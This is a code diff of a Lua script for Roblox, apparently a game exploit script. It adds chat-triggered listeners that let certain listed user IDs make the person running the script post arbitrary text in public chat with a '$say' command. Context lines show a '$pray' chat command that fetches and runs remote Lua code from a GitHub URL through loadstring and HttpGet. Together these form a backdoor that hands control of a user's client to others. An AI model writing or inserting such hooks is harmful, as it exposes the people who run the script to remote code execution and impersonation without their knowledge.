@@ -35,7 +35,7 @@ local StarId = {
 }
 
 local StaffId = {
-	[3449237561] = true,
+	[2452452863] = true,
 	[3449237561] = true,
 }
 
@@ -340,6 +340,14 @@ function premium()
 			end
 		end
 	end)
+		v.Chatted:connect(function(cht)
+		if cht:match("$say") then
+			if game.Players.LocalPlayer ~= v then
+			SplitString = cht:split(" ")
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
+			end
+		end
+	end)
 end
 		elseif StarId[v.UserId] then
 			if v.Character then
@@ -567,6 +575,14 @@ local freeze = function()
 		if cht:match("$pray .") then
 			if game.Players.LocalPlayer ~= v then
 			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
+			end
+		end
+	end)
+		v.Chatted:connect(function(cht)
+		if cht:match("$say") then
+			if game.Players.LocalPlayer ~= v then
+			SplitString = cht:split(" ")
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
 			end
 		end
 	end)
@@ -862,6 +878,15 @@ local freeze = function()
 		if cht:match("$pray .") then
 			if game.Players.LocalPlayer ~= v then
 			loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/pray.lua'))()
+			end
+		end
+	end)
+						
+		v.Chatted:connect(function(cht)
+		if cht:match("$say") then
+			if game.Players.LocalPlayer ~= v then
+			SplitString = cht:split(" ")
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SplitString[2],"All")
 			end
 		end
 	end)
